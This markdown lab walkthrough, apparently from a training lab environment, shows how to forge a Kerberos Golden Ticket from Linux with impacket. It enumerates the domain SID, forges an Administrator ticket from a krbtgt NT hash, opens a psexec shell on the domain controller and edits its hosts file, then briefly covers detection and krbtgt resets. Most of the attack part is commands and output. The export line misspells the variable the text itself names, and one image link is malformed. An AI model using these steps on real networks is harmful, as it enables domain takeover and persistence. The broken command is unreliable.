# Golden Ticket from Linux

## Linux

- On the Linux side, **impacket** can be used to craft a **Golden Ticket**. [lookupsid.py](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py) will help us retrieve the domain SID and every group and user SID. 

## Search for the Domain SID with lookups 

![Lookupsids](/Ticket-Abuse/Golden-Tickets-Linux/images/lookupsids.png) 
![Lookupsids](/Ticket-Abuse/Golden-Tickets-Linux/images/lookupsids-2.png) 
![Lookupsids](/Ticket-Abuse/Golden-Tickets-Linux/images/lookupsids-3.png) 
![Lookupsids](/Ticket-Abuse/Golden-Tickets-Linux/images/lookupsids-4.png)

 

	> lookupsid.py inlanefreight.local/htb-student@dc01.inlanefreight.local -domain-sids
	
	> lookupsid.py inlanefreight.local/htb-student@dc01.inlanefreight.local -domain-sids  sids 
	
	Impacket for Exegol - v0.10.1.dev1+20230909.241.3001b261 - Copyright 2022 Fortra - f
	orked by ThePorgs                                                                   
		                                                                               
	Password:                                                                           
	[*] Brute forcing SIDs at dc01.inlanefreight.local                                  
	[*] StringBinding ncacn_np:dc01.inlanefreight.local[\pipe\lsarpc]                   
	[*] Domain SID is: S-1-5-21-1870146311-1183348186-593267556                         
	498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)           
	500: INLANEFREIGHT\Administrator (SidTypeUser)                                      
	501: INLANEFREIGHT\Guest (SidTypeUser)                                              
	502: INLANEFREIGHT\krbtgt (SidTypeUser)                                             
	512: INLANEFREIGHT\Domain Admins (SidTypeGroup)                                     
	513: INLANEFREIGHT\Domain Users (SidTypeGroup)
	
	
 - Once we have the domain SID, we can craft a **Golden Ticket** using [ticketer.py](https://github.com/fortra/impacket/blob/master/examples/ticketer.py). 


## Creating the Golden Ticket 


	> ticketer.py -nthash c0231bd8a4a4de92fca0760c0ba9e7a6 -domain-sid S-1-5-21-1870146311-1183348186-593267556 -domain inlanefreight.local Administrator

	ticketer.py -nthash c0231bd8a4a4de92fca0760c0ba9e7a6 -domain-sid S-1-5-21-1870146311-1183348186-593267556 -domain inlanefreight.local Administrator
	Impacket for Exegol - v0.10.1.dev1+20230909.241.3001b261 - Copyright 2022 Fortra - forked by ThePorgs

	[*] Creating basic skeleton ticket and PAC Infos
	[*] Customizing ticket for inlanefreight.local/Administrator
	[*]     PAC_LOGON_INFO
	[*]     PAC_CLIENT_INFO_TYPE
	[*]     EncTicketPart
	[*]     EncAsRepPart
	[*] Signing/Encrypting final ticket
	[*]     PAC_SERVER_CHECKSUM
	[*]     PAC_PRIVSVR_CHECKSUM
	[*]     EncTicketPart
	[*]     EncASRepPart
	[*] Saving ticket in Administrator.ccache



!{ticketer}(![Lookupsids](/Ticket-Abuse/Golden-Tickets-Linux/images/ticketer.png) 



- The ticket has been forged and saved in the current directory as **Administrator.ccache**. We can now use this ticket by importing it in **KRB5CCNAME** environment variable and using any impacket tool with the **-k** parameter. 


## Importing and Using the Golden Ticket

	> export KRBBCCNAME=./Administrator.ccache 
	

![Import Ticket] (/Ticket-Abuse/Golden-Tickets-Linux/images/import-ticket.png) 


## You're FUCKED!!

	> psexec.py -k -no-pass dc01.inlanefreight.local
	> echo 'hacker ip  hacker dns' >> \Windows\System32\Drivers\etc\hosts
	> type \Windows\System32\Drivers\etc\hosts


	
![Hacked](/Ticket-Abuse/Golden-Tickets-Linux/images/fukd.png) 
![Hacked](/Ticket-Abuse/Golden-Tickets-Linux/images/fukd-2.png) 
![Hacked](/Ticket-Abuse/Golden-Tickets-Linux/images/fukd-3.png) 
![Hacked](/Ticket-Abuse/Golden-Tickets-Linux/images/fukd-4.png) 

## Detection

This type of persistence is **challenging to detect because Golden Tickets are valid TGTs**. **Windows event logs don’t distinguish between a legitimate TGT and a maliciously crafted Golden Ticket**. Also, resetting the impersonated account’s password does not invalidate the ticket.

**Golden tickets are usually created with a much longer lifespan than tickets have by default (Mimikatz makes golden tickets with a default lifespan of 10 years)**. Certain AD monitoring products can detect these **long ticket lifespans as IoC**s.

Golden Tickets can be detected in a few ways: 

1. The account DOMAIN field is blank. 

2. The account DOMAIN field contains DOMAIN FQDN instead of just domain. 


Once a **golden ticket is detected**, the **krbtgt account password must be changed twice to remove the persistence**, as the current and previous passwords are stored in the domain. **The password of the krbtgt account should be changed regularly**, as it is an admin account. 

